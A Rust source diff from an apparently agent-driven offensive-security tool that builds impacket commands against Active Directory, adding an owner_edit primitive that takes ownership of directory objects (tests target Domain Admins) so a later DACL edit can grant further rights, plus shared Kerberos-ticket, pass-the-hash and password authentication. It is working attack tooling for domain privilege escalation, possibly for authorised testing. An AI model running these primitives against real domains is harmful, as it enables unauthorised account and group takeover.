@@ -584,16 +584,38 @@ pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
     let target_dn = required_str(args, "target_dn")?;
     let action = optional_str(args, "action").unwrap_or("write");
 
-    let mut cmd = CommandBuilder::new("dacledit.py")
+    let cmd = CommandBuilder::new("dacledit.py")
         .flag("-action", action)
         .flag("-principal", principal)
         .flag("-rights", rights)
         .flag("-target-dn", target_dn);
 
+    Ok(
+        apply_impacket_ldap_auth(cmd, args, domain, username, dc_ip)?
+            .flag("-dc-ip", dc_ip)
+            .timeout_secs(120),
+    )
+}
+
+/// Append the impacket authentication group shared by every impacket example
+/// script that binds LDAP: the positional target string plus whichever of
+/// `-k -no-pass`, `-hashes LM:NT -no-pass`, or an inline password the operation
+/// actually holds.
+///
+/// Precedence is `ticket_path` > `hash` > `password`, and a call with none of
+/// them is an error rather than an anonymous bind — a tool that reaches the DC
+/// unauthenticated burns the agent's budget on a guaranteed `invalidCredentials`.
+fn apply_impacket_ldap_auth(
+    cmd: CommandBuilder,
+    args: &Value,
+    domain: &str,
+    username: &str,
+    dc_ip: &str,
+) -> Result<CommandBuilder> {
     if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
         let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
         let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
-        cmd = cmd
+        return Ok(cmd
             .arg(credentials::impacket_target(
                 Some(domain),
                 username,
@@ -603,9 +625,10 @@ pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
             .arg("-k")
             .arg("-no-pass")
             .env(ccname_key, ccname_val)
-            .env(cfg_key, cfg_val);
-    } else if let Some(raw) = credentials::ntlm_hash_arg(args) {
-        cmd = cmd
+            .env(cfg_key, cfg_val));
+    }
+    if let Some(raw) = credentials::ntlm_hash_arg(args) {
+        return Ok(cmd
             .arg(credentials::impacket_target(
                 Some(domain),
                 username,
@@ -613,20 +636,115 @@ pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
                 dc_ip,
             ))
             .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
-            .arg("-no-pass");
+            .arg("-no-pass"));
+    }
+    let password = optional_str(args, "password")
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
+    Ok(cmd.arg(credentials::impacket_target(
+        Some(domain),
+        username,
+        Some(password),
+        dc_ip,
+    )))
+}
+
+/// Read or take ownership of an AD object via `owneredit.py`.
+///
+/// Required args: `domain`, `username`, `dc_ip`, and one of `target_dn` /
+/// `target` / `target_user`. `action="write"` (the default) additionally
+/// requires `new_owner` (or `principal`).
+/// Optional args: `action` (`"write"` | `"read"`).
+/// Auth — one of (precedence: ticket_path > hash > password), see
+/// [`apply_impacket_ldap_auth`].
+///
+/// This is the missing half of the WriteOwner edge. `dacl_edit` can *grant* a
+/// WriteOwner right but cannot *take* ownership, so a `writeowner` edge had no
+/// primitive at all: every dispatch had to try `dacl_edit` against an object
+/// whose DACL we are not yet allowed to write. Taking ownership first is what
+/// makes the follow-up `dacl_edit` legal, because an object's owner holds
+/// `WRITE_DAC` implicitly regardless of its DACL.
+///
+/// Both `new_owner` and the target accept either a SAM account name or a
+/// distinguished name; a value containing `=` is routed to owneredit's
+/// `-new-owner-dn` / `-target-dn` and everything else to `-new-owner` /
+/// `-target`. owneredit resolves the SID from whichever it is given, and
+/// passing a DN to the SAM flag matches nothing and exits non-zero.
+pub async fn owner_edit(args: &Value) -> Result<ToolOutput> {
+    build_owner_edit(args)?.execute().await
+}
+
+/// Route an owneredit principal reference to its SAM-name or DN flag.
+fn owneredit_identity_flag(
+    value: &str,
+    sam_flag: &'static str,
+    dn_flag: &'static str,
+) -> &'static str {
+    if value.contains('=') {
+        dn_flag
     } else {
-        let password = optional_str(args, "password")
-            .filter(|s| !s.is_empty())
-            .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
-        cmd = cmd.arg(credentials::impacket_target(
-            Some(domain),
-            username,
-            Some(password),
-            dc_ip,
-        ));
+        sam_flag
+    }
+}
+
+#[doc(hidden)]
+pub fn build_owner_edit(args: &Value) -> Result<CommandBuilder> {
+    let domain = required_str(args, "domain")?;
+    let username = required_str(args, "username")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let action = optional_str(args, "action")
+        .filter(|s| !s.is_empty())
+        .unwrap_or("write");
+
+    if action != "read" && action != "write" {
+        anyhow::bail!(
+            "owner_edit action={action} is not supported — owneredit.py accepts only \
+             'read' (report the current owner) or 'write' (take ownership)"
+        );
     }
 
-    Ok(cmd.flag("-dc-ip", dc_ip).timeout_secs(120))
+    let target = optional_str(args, "target_dn")
+        .or_else(|| optional_str(args, "target"))
+        .or_else(|| optional_str(args, "target_user"))
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| {
+            anyhow::anyhow!(
+                "owner_edit requires the object whose owner is being read or replaced: \
+                 pass `target` (SAM account name) or `target_dn` (distinguished name)"
+            )
+        })?;
+
+    let mut cmd = CommandBuilder::new("owneredit.py")
+        .flag("-action", action)
+        .flag(
+            owneredit_identity_flag(target, "-target", "-target-dn"),
+            target,
+        );
+
+    if action == "write" {
+        let new_owner = optional_str(args, "new_owner")
+            .or_else(|| optional_str(args, "principal"))
+            .map(str::trim)
+            .filter(|s| !s.is_empty())
+            .ok_or_else(|| {
+                anyhow::anyhow!(
+                    "owner_edit action=write requires `new_owner`: the principal we control \
+                     that should become the owner of '{target}'. Use action=read to report \
+                     the current owner without changing it."
+                )
+            })?;
+        cmd = cmd.flag(
+            owneredit_identity_flag(new_owner, "-new-owner", "-new-owner-dn"),
+            new_owner,
+        );
+    }
+
+    Ok(
+        apply_impacket_ldap_auth(cmd, args, domain, username, dc_ip)?
+            .flag("-dc-ip", dc_ip)
+            .timeout_secs(120),
+    )
 }
 
 #[cfg(test)]
@@ -2233,5 +2351,138 @@ mod tests {
             "dc_ip": "192.168.58.10", "principal": "bob", "right": "WriteDacl"
         });
         assert!(super::build_adminsd_holder_add_ace(&args).is_err());
+    }
+
+    #[test]
+    fn owner_edit_write_is_explicit_and_names_both_principals() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "target": "svc_sql", "new_owner": "alice"
+        });
+        let cmd = super::build_owner_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-action"),
+            Some("write"),
+            "owneredit.py defaults -action to read; a take-ownership call that \
+             omits the flag reports the owner and changes nothing"
+        );
+        assert_eq!(flag_value(argv, "-target"), Some("svc_sql"));
+        assert_eq!(flag_value(argv, "-new-owner"), Some("alice"));
+        assert_eq!(flag_value(argv, "-dc-ip"), Some("192.168.58.10"));
+    }
+
+    #[test]
+    fn owner_edit_routes_distinguished_names_to_the_dn_flags() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_dn": "CN=Domain Admins,CN=Users,DC=contoso,DC=local",
+            "new_owner": "CN=alice,CN=Users,DC=contoso,DC=local"
+        });
+        let cmd = super::build_owner_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-target-dn"),
+            Some("CN=Domain Admins,CN=Users,DC=contoso,DC=local")
+        );
+        assert_eq!(
+            flag_value(argv, "-new-owner-dn"),
+            Some("CN=alice,CN=Users,DC=contoso,DC=local")
+        );
+        assert!(argv.iter().all(|a| a != "-target"));
+        assert!(argv.iter().all(|a| a != "-new-owner"));
+    }
+
+    #[test]
+    fn owner_edit_read_needs_no_new_owner() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "target": "svc_sql", "action": "read"
+        });
+        let cmd = super::build_owner_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(flag_value(argv, "-action"), Some("read"));
+        assert!(argv.iter().all(|a| a != "-new-owner"));
+    }
+
+    #[test]
+    fn owner_edit_write_without_new_owner_errors() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "target": "svc_sql"
+        });
+        let err = match super::build_owner_edit(&args) {
+            Ok(_) => panic!("action=write without new_owner must not build a command"),
+            Err(e) => e.to_string(),
+        };
+        assert!(
+            err.contains("new_owner"),
+            "error must name the missing argument; got: {err}"
+        );
+    }
+
+    #[test]
+    fn owner_edit_without_a_target_errors() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "new_owner": "alice"
+        });
+        assert!(super::build_owner_edit(&args).is_err());
+    }
+
+    #[test]
+    fn owner_edit_rejects_actions_owneredit_does_not_have() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10", "target": "svc_sql", "action": "restore"
+        });
+        assert!(super::build_owner_edit(&args).is_err());
+    }
+
+    #[test]
+    fn owner_edit_hash_uses_impacket_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "target": "svc_sql", "new_owner": "alice",
+            "hash": NT
+        });
+        let cmd = super::build_owner_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-hashes"),
+            Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str())
+        );
+        assert!(argv.iter().any(|a| a == "-no-pass"));
+        assert!(argv
+            .iter()
+            .any(|a| a == "contoso.local/alice@192.168.58.10"));
+    }
+
+    #[test]
+    fn owner_edit_ticket_uses_kerberos_flags() {
+        let args = json!({
+            "domain": "fabrikam.local", "username": "bob",
+            "dc_ip": "192.168.58.20", "target": "svc_sql", "new_owner": "bob",
+            "ticket_path": "/tmp/ares-tickets/bob.ccache"
+        });
+        let cmd = super::build_owner_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "-k"));
+        assert!(argv.iter().any(|a| a == "-no-pass"));
+        assert!(argv.iter().all(|a| a != "-hashes"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/bob.ccache"));
+    }
+
+    #[test]
+    fn owner_edit_without_auth_material_errors() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "target": "svc_sql", "new_owner": "alice"
+        });
+        assert!(super::build_owner_edit(&args).is_err());
     }
 }
